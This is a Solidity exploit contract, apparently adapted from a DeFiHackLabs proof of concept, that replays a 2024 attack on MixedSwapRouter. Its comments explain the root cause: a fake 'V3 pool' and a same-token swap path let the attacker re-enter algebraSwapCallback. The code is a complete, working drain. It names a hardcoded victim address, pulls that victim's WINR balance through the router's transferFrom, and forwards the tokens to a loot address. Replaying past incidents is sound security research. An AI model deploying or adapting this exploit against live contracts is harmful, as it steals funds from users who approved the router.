// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-05-MixedSwapRouter).
// The DeFiHackLabs PoC has NO single top-level exploit contract that the outer
// attacker directly calls with useful args: `ContractTest.attack()` CREATE2-deploys
// `Exploit`, whose constructor CREATE2-deploys `Moneys` (the fake "V3 pool") and
// immediately calls `MixedSwapRouter.swapTokensForTokens(...)`. `Moneys.swap()` then
// re-enters `algebraSwapCallback` with `payer = victim` and forwards the drained WINR
// to a hardcoded EOA. This contract faithfully inlines all three original contracts'
// logic (ContractTest.attack -> Exploit.attacks -> Moneys.swap) into one entrypoint
// (`run()`) so the playground can deploy and record it. Logic and constants are
// copied verbatim from test/MixedSwapRouter_exp.sol.
//
// Root cause: MixedSwapRouter treats any contract with a non-reverting fee() as a
// valid "V3 pool" (isV3), and _validatePoolTokens is a no-op when the swap path
// encodes tokenA == tokenB. A same-token path plus a self-deployed fake pool lets the
// attacker re-enter algebraSwapCallback with an attacker-chosen `payer`, so the
// router's own `pay()` executes `WINR.transferFrom(victim, fakePool, victim's full
// balance)` -- draining any WINR holder who had approved the router.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IMixedSwapRouter {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMin;
        address[] pool;
    }

    struct SwapCallbackData {
        bytes path;
        address payer;
        address pool;
    }

    function swapTokensForTokens(ExactInputParams memory params) external;
    function algebraSwapCallback(int256 amount0, int256 amount1, bytes calldata data) external;
}

// The fake "V3 pool" -- a faithful copy of `Moneys` from the Foundry PoC.
contract Moneys {
    IERC20 constant WINR = IERC20(0xD77B108d4f6cefaa0Cae9506A934e825BEccA46E);
    address constant VICTIM = 0xb6d566c4d645ab640fc6Ac362f233dCFB5621f7C;
    IMixedSwapRouter constant SWAP_ROUTER = IMixedSwapRouter(0xE3E98241CB99AF7a452e94B9cf219aAa766e0869);
    // Historical "attacker EOA" the original PoC forwards loot to (ContractTest's own
    // address in the DeFiHackLabs harness).
    address constant LOOT_RECIPIENT = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496;

    // Any non-reverting fee() makes isV3() return true.
    function fee() public pure returns (uint256) {
        return 0;
    }

    // Same-token path: token0 == token1 == WINR defeats _validatePoolTokens.
    function token0() public pure returns (address) {
        return address(WINR);
    }

    function token1() public pure returns (address) {
        return address(WINR);
    }

    // Called back by the router as the "V3 pool" for the swap hop. Re-enters the
    // router's callback with payer = VICTIM and pool = address(this), then forwards
    // the drained WINR to LOOT_RECIPIENT.
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) public returns (uint256, uint256) {
        IMixedSwapRouter.SwapCallbackData memory params = IMixedSwapRouter.SwapCallbackData({
            path: hex"d77b108d4f6cefaa0cae9506a934e825becca46e000000d77b108d4f6cefaa0cae9506a934e825becca46e",
            payer: VICTIM,
            pool: address(this)
        });
        bytes memory encodedParams = abi.encode(params);
        SWAP_ROUTER.algebraSwapCallback(
            -20_057_735_863_910_611_438,
            293_182_421_809_175_367_609_122,
            encodedParams
        );
        WINR.transfer(LOOT_RECIPIENT, WINR.balanceOf(address(this)));
        return (10, 10);
    }
}

// Top-level entrypoint -- inlines `Exploit.attacks()` from the Foundry PoC.
contract MixedSwapRouterDrain {
    IMixedSwapRouter constant SWAP_ROUTER = IMixedSwapRouter(0xE3E98241CB99AF7a452e94B9cf219aAa766e0869);

    function run() external {
        Moneys fakePool = new Moneys();

        address[] memory pools = new address[](1);
        pools[0] = address(fakePool);

        IMixedSwapRouter.ExactInputParams memory params = IMixedSwapRouter.ExactInputParams({
            path: hex"d77b108d4f6cefaa0cae9506a934e825becca46e000000d77b108d4f6cefaa0cae9506a934e825becca46e",
            recipient: address(this),
            deadline: block.timestamp + 1000,
            amountIn: 10,
            amountOutMin: 10,
            pool: pools
        });
        SWAP_ROUTER.swapTokensForTokens(params);
    }

    // Router hands V3-hop control back to a contract implementing this ABI; accept
    // any inbound value so the callback flow can't be blocked.
    fallback() external payable {}
    receive() external payable {}
}
